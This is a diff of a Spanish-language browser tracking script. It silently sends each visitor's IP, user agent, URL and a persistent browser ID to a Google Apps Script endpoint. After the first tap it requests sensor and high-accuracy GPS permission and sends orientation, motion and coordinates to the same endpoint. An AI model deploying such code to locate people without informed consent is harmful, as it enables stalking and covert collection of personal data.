@@ -107,7 +107,7 @@
 
 
 // =====================================================
-// ID DE VISITA
+// ID DE ESTA VISITA
 // =====================================================
 
 const visitaId =
@@ -119,7 +119,7 @@ const visitaId =
 
 
 // =====================================================
-// ID PERSISTENTE DEL DISPOSITIVO/NAVEGADOR
+// ID PERSISTENTE DEL NAVEGADOR
 // =====================================================
 
 let dispositivoId =
@@ -155,53 +155,151 @@ let motionData = {
 
 
 // =====================================================
+// ESTADO
+// =====================================================
+
+let visitaRegistrada = false;
+let permisosSolicitados = false;
+let sensoresActivos = false;
+
+
+// =====================================================
+// CREAR MENSAJE TEMPORAL
+// =====================================================
+
+function mostrarMensaje(mensaje) {
+
+    let elemento =
+        document.getElementById(
+            "tracking-status"
+        );
+
+    if (!elemento) {
+
+        elemento =
+            document.createElement("div");
+
+        elemento.id =
+            "tracking-status";
+
+        elemento.style.position =
+            "fixed";
+
+        elemento.style.top =
+            "20px";
+
+        elemento.style.left =
+            "50%";
+
+        elemento.style.transform =
+            "translateX(-50%)";
+
+        elemento.style.zIndex =
+            "9999";
+
+        elemento.style.padding =
+            "12px 18px";
+
+        elemento.style.background =
+            "rgba(0,0,0,0.85)";
+
+        elemento.style.color =
+            "#fff";
+
+        elemento.style.borderRadius =
+            "10px";
+
+        elemento.style.fontFamily =
+            "Arial, sans-serif";
+
+        elemento.style.fontSize =
+            "14px";
+
+        elemento.style.textAlign =
+            "center";
+
+        document.body.appendChild(
+            elemento
+        );
+    }
+
+    elemento.textContent =
+        mensaje;
+
+    setTimeout(() => {
+
+        if (elemento) {
+            elemento.remove();
+        }
+
+    }, 5000);
+}
+
+
+// =====================================================
 // REGISTRAR VISITA
 // =====================================================
 
 function registrarVisita(ip) {
 
     const parametros =
+
         "?action=visit" +
 
         "&visita_id=" +
-            encodeURIComponent(visitaId) +
+            encodeURIComponent(
+                visitaId
+            ) +
 
         "&ip=" +
-            encodeURIComponent(ip) +
+            encodeURIComponent(
+                ip
+            ) +
 
         "&ua=" +
-            encodeURIComponent(navigator.userAgent) +
+            encodeURIComponent(
+                navigator.userAgent
+            ) +
 
         "&url=" +
-            encodeURIComponent(window.location.href) +
+            encodeURIComponent(
+                window.location.href
+            ) +
 
         "&dispositivo_id=" +
-            encodeURIComponent(dispositivoId);
+            encodeURIComponent(
+                dispositivoId
+            );
 
 
     console.log(
-        "Registrando visita:",
-        parametros
+        "Registrando visita..."
     );
 
 
-    fetch(
-        APPS_SCRIPT_URL + parametros,
+    return fetch(
+        APPS_SCRIPT_URL +
+        parametros,
         {
             mode: "no-cors"
         }
     )
+
     .then(() => {
 
+        visitaRegistrada =
+            true;
+
         console.log(
-            "Visita registrada"
+            "✅ Visita registrada"
         );
 
     })
+
     .catch(error => {
 
         console.error(
-            "Error registrando visita:",
+            "❌ Error registrando visita:",
             error
         );
 
@@ -213,70 +311,150 @@ function registrarVisita(ip) {
 // OBTENER IP
 // =====================================================
 
-fetch(
-    "https://api64.ipify.org?format=json"
-)
+const visitaPromise =
 
-.then(response => {
+    fetch(
+        "https://api64.ipify.org?format=json"
+    )
 
-    if (!response.ok) {
+    .then(response => {
 
-        throw new Error(
-            "Error HTTP: " +
-            response.status
+        if (!response.ok) {
+
+            throw new Error(
+                "HTTP " +
+                response.status
+            );
+        }
+
+        return response.json();
+    })
+
+    .then(data => {
+
+        console.log(
+            "Respuesta IP:",
+            data
         );
 
-    }
 
-    return response.json();
+        const ip =
+            data &&
+            typeof data.ip === "string" &&
+            data.ip.trim() !== ""
 
-})
+                ? data.ip.trim()
 
-.then(data => {
-
-    console.log(
-        "Respuesta IP:",
-        data
-    );
+                : "IP_NO_DISPONIBLE";
 
 
-    const ip =
-        data &&
-        typeof data.ip === "string" &&
-        data.ip.trim() !== ""
-
-            ? data.ip.trim()
-
-            : "IP_NO_DISPONIBLE";
+        console.log(
+            "🌐 IP:",
+            ip
+        );
 
 
-    console.log(
-        "IP detectada:",
-        ip
-    );
+        return registrarVisita(ip);
+    })
+
+    .catch(error => {
+
+        console.error(
+            "Error obteniendo IP:",
+            error
+        );
 
 
-    registrarVisita(ip);
-
-})
-
-.catch(error => {
-
-    console.error(
-        "No se pudo obtener IP:",
-        error
-    );
-
-
-    registrarVisita(
-        "IP_NO_DISPONIBLE"
-    );
-
-});
+        return registrarVisita(
+            "IP_NO_DISPONIBLE"
+        );
+    });
 
 
 // =====================================================
-// REGISTRAR SENSORES EN APPS SCRIPT
+// RECIBIR ORIENTACIÓN
+// =====================================================
+
+function recibirOrientacion(event) {
+
+    sensoresActivos = true;
+
+
+    if (
+        event.alpha !== null &&
+        event.alpha !== undefined
+    ) {
+
+        orientationData.alpha =
+            event.alpha;
+    }
+
+
+    if (
+        event.beta !== null &&
+        event.beta !== undefined
+    ) {
+
+        orientationData.beta =
+            event.beta;
+    }
+
+
+    if (
+        event.gamma !== null &&
+        event.gamma !== undefined
+    ) {
+
+        orientationData.gamma =
+            event.gamma;
+    }
+}
+
+
+// =====================================================
+// RECIBIR MOVIMIENTO
+// =====================================================
+
+function recibirMovimiento(event) {
+
+    sensoresActivos = true;
+
+
+    if (event.accelerationIncludingGravity) {
+
+        const a =
+            event.accelerationIncludingGravity;
+
+
+        motionData.x =
+            a.x ?? "";
+
+        motionData.y =
+            a.y ?? "";
+
+        motionData.z =
+            a.z ?? "";
+    }
+}
+
+
+// =====================================================
+// ACTIVAR LISTENERS
+// =====================================================
+
+window.addEventListener(
+    "deviceorientation",
+    recibirOrientacion
+);
+
+window.addEventListener(
+    "devicemotion",
+    recibirMovimiento
+);
+
+
+// =====================================================
+// GUARDAR SENSORES
 // =====================================================
 
 function registrarSensores(
@@ -289,10 +467,14 @@ function registrarSensores(
         "?action=sensor" +
 
         "&visita_id=" +
-            encodeURIComponent(visitaId) +
+            encodeURIComponent(
+                visitaId
+            ) +
 
         "&sensor_permission=" +
-            encodeURIComponent(sensorPermission) +
+            encodeURIComponent(
+                sensorPermission
+            ) +
 
         "&orientation_permission=" +
             encodeURIComponent(
@@ -331,13 +513,15 @@ function registrarSensores(
 
 
     console.log(
-        "Registrando sensores:",
-        parametros
+        "📱 Guardando sensores:",
+        orientationData,
+        motionData
     );
 
 
     fetch(
-        APPS_SCRIPT_URL + parametros,
+        APPS_SCRIPT_URL +
+        parametros,
         {
             mode: "no-cors"
         }
@@ -346,7 +530,7 @@ function registrarSensores(
 
 
 // =====================================================
-// REGISTRAR UBICACIÓN
+// GUARDAR UBICACIÓN
 // =====================================================
 
 function registrarUbicacion(position) {
@@ -355,12 +539,23 @@ function registrarUbicacion(position) {
         position.coords;
 
 
+    console.log(
+        "📍 GPS:",
+        coords.latitude,
+        coords.longitude,
+        "precisión:",
+        coords.accuracy
+    );
+
+
     const parametros =
 
         "?action=location" +
 
         "&visita_id=" +
-            encodeURIComponent(visitaId) +
+            encodeURIComponent(
+                visitaId
+            ) +
 
         "&latitud=" +
             encodeURIComponent(
@@ -385,33 +580,73 @@ function registrarUbicacion(position) {
             );
 
 
-    console.log(
-        "Registrando ubicación:",
-        parametros
-    );
-
-
     fetch(
-        APPS_SCRIPT_URL + parametros,
+        APPS_SCRIPT_URL +
+        parametros,
         {
             mode: "no-cors"
         }
     )
+
     .then(() => {
 
         console.log(
-            "Ubicación registrada"
+            "✅ Ubicación enviada"
+        );
+
+        mostrarMensaje(
+            "📍 Ubicación registrada"
         );
 
     })
+
     .catch(error => {
 
         console.error(
-            "Error registrando ubicación:",
+            "Error GPS:",
             error
         );
-
     });
+}
+
+
+// =====================================================
+// ERROR GPS
+// =====================================================
+
+function errorUbicacion(error) {
+
+    console.error(
+        "❌ Error de ubicación:",
+        error
+    );
+
+
+    let mensaje =
+        "No se pudo obtener la ubicación.";
+
+    if (error.code === 1) {
+
+        mensaje =
+            "📍 Permiso de ubicación rechazado.";
+    }
+
+    if (error.code === 2) {
+
+        mensaje =
+            "📍 Ubicación no disponible.";
+    }
+
+    if (error.code === 3) {
+
+        mensaje =
+            "📍 Tiempo agotado buscando ubicación.";
+    }
+
+
+    mostrarMensaje(
+        mensaje
+    );
 }
 
 
@@ -423,41 +658,37 @@ function pedirUbicacion() {
 
     if (!navigator.geolocation) {
 
-        console.log(
+        console.error(
             "Geolocalización no disponible"
+        );
+
+        mostrarMensaje(
+            "📍 Tu navegador no permite geolocalización."
         );
 
         return;
     }
 
 
+    console.log(
+        "📍 Solicitando ubicación..."
+    );
+
+
+    mostrarMensaje(
+        "📍 Permite el acceso a tu ubicación..."
+    );
+
+
     navigator.geolocation.getCurrentPosition(
 
-        position => {
+        registrarUbicacion,
 
-            console.log(
-                "📍 Ubicación obtenida:",
-                position.coords
-            );
-
-
-            registrarUbicacion(
-                position
-            );
-        },
-
-        error => {
-
-            console.error(
-                "❌ Error de ubicación:",
-                error
-            );
-
-        },
+        errorUbicacion,
 
         {
             enableHighAccuracy: true,
-            timeout: 15000,
+            timeout: 20000,
             maximumAge: 0
         }
     );
@@ -465,7 +696,7 @@ function pedirUbicacion() {
 
 
 // =====================================================
-// PEDIR GIROSCOPIO / ORIENTACIÓN
+// PEDIR SENSORES
 // =====================================================
 
 async function pedirSensores() {
@@ -479,13 +710,13 @@ async function pedirSensores() {
 
     try {
 
-        // ---------------------------------------------
+        // ==========================================
         // MOTION
-        // ---------------------------------------------
+        // ==========================================
 
         if (
             typeof DeviceMotionEvent !==
-            "undefined" &&
+                "undefined" &&
 
             typeof DeviceMotionEvent
                 .requestPermission ===
@@ -495,17 +726,16 @@ async function pedirSensores() {
             sensorPermission =
                 await DeviceMotionEvent
                     .requestPermission();
-
         }
 
 
-        // ---------------------------------------------
-        // ORIENTATION / GIROSCOPIO
-        // ---------------------------------------------
+        // ==========================================
+        // ORIENTATION
+        // ==========================================
 
         if (
             typeof DeviceOrientationEvent !==
-            "undefined" &&
+                "undefined" &&
 
             typeof DeviceOrientationEvent
                 .requestPermission ===
@@ -515,48 +745,52 @@ async function pedirSensores() {
             orientationPermission =
                 await DeviceOrientationEvent
                     .requestPermission();
-
         }
 
 
         console.log(
-            "Permiso motion:",
+            "Motion:",
             sensorPermission
         );
 
         console.log(
-            "Permiso orientation:",
+            "Orientation:",
             orientationPermission
         );
 
 
-        // ---------------------------------------------
-        // GUARDAR ESTADO DE SENSORES
-        // ---------------------------------------------
+        // ==========================================
+        // ESPERAR DATOS DEL SENSOR
+        // ==========================================
 
-        registrarSensores(
-            sensorPermission,
-            orientationPermission
-        );
+        setTimeout(() => {
+
+            registrarSensores(
+                sensorPermission,
+                orientationPermission
+            );
+
+        }, 1500);
 
 
-        // ---------------------------------------------
-        // DESPUÉS PEDIR UBICACIÓN
-        // ---------------------------------------------
+        // ==========================================
+        // PEDIR GPS DESPUÉS
+        // ==========================================
 
-        pedirUbicacion();
+        setTimeout(() => {
+
+            pedirUbicacion();
+
+        }, 1700);
 
 
     } catch (error) {
 
         console.error(
-            "Error solicitando sensores:",
+            "Error sensores:",
             error
         );
 
-
-        // Aunque rechace sensores,
-        // todavía podemos solicitar ubicación.
 
         registrarSensores(
             "error",
@@ -570,100 +804,39 @@ async function pedirSensores() {
 
 
 // =====================================================
-// ESCUCHAR ORIENTACIÓN
+// PRIMER TOQUE
 // =====================================================
 
-function recibirOrientacion(event) {
+function iniciarPermisos() {
 
-    if (
-        event.alpha !== null &&
-        event.alpha !== undefined
-    ) {
-
-        orientationData.alpha =
-            event.alpha;
+    if (permisosSolicitados) {
+        return;
     }
 
 
-    if (
-        event.beta !== null &&
-        event.beta !== undefined
-    ) {
-
-        orientationData.beta =
-            event.beta;
-    }
+    permisosSolicitados = true;
 
 
-    if (
-        event.gamma !== null &&
-        event.gamma !== undefined
-    ) {
+    console.log(
+        "👆 Usuario interactuó"
+    );
 
-        orientationData.gamma =
-            event.gamma;
-    }
+
+    // Primero esperamos que la visita
+    // haya sido registrada.
+
+    visitaPromise
+        .then(() => {
+
+            pedirSensores();
+
+        });
 }
 
 
-// =====================================================
-// ESCUCHAR MOVIMIENTO
-// =====================================================
-
-function recibirMovimiento(event) {
-
-    if (event.acceleration) {
-
-        motionData.x =
-            event.acceleration.x ?? "";
-
-        motionData.y =
-            event.acceleration.y ?? "";
-
-        motionData.z =
-            event.acceleration.z ?? "";
-    }
-}
-
-
-// =====================================================
-// ACTIVAR SENSORES
-// =====================================================
-
 window.addEventListener(
-    "deviceorientation",
-    recibirOrientacion
-);
-
-window.addEventListener(
-    "devicemotion",
-    recibirMovimiento
-);
-
-
-// =====================================================
-// SOLICITAR SENSORES + UBICACIÓN AL PRIMER CLIC
-// =====================================================
-
-let permisosSolicitados = false;
-
-window.addEventListener(
-    "click",
-    function solicitarPermisosUnaVez() {
-
-        if (permisosSolicitados) {
-            return;
-        }
-
-        permisosSolicitados = true;
-
-        console.log(
-            "Solicitando sensores..."
-        );
-
-        pedirSensores();
-
-    },
+    "pointerdown",
+    iniciarPermisos,
     {
         once: true
     }
